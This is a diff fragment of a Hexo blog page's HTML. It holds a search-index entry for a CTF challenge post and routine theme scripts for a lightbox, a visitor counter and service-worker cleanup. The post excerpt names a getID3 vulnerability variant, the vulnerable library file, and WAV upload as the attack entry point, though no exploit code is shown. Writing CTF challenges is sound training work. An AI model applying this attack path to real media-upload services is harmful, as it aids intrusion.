+          title: "出题——G.T.I 巡查团",
+          url: "https://suc2es2.github.io/2026/08/28/%E5%87%BA%E9%A2%98-GTI%20%E5%B7%A1%E6%9F%A5%E5%9B%A2/",
+          excerpt: "",
+          description: "",
+          stripContent: "出题——G.T.I 巡查团本题来源于三角洲以及最近实战中所打的漏洞 基于 CVE-2026-94108 变种，属于 0day 一类，难度较高，不知道 AI 能不能跑出来 信息收集在源码中发现一段注释，暂且不知道何意为  注册一个账号登录后可以上传媒体文件作为巡查的素材，上传 WAV 是攻击入口  CVE-2026-94108漏洞源码位于 getid3-1.9.26/getid3/getid3.lib.php 12345678910111213// ===== 第 14-20 行：XML 解析选项",
+          date: "Fri Aug 28 2026 02:39:00 GMT+0800",
+          updated: "Thu Sep 24 2026 10:47:56 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
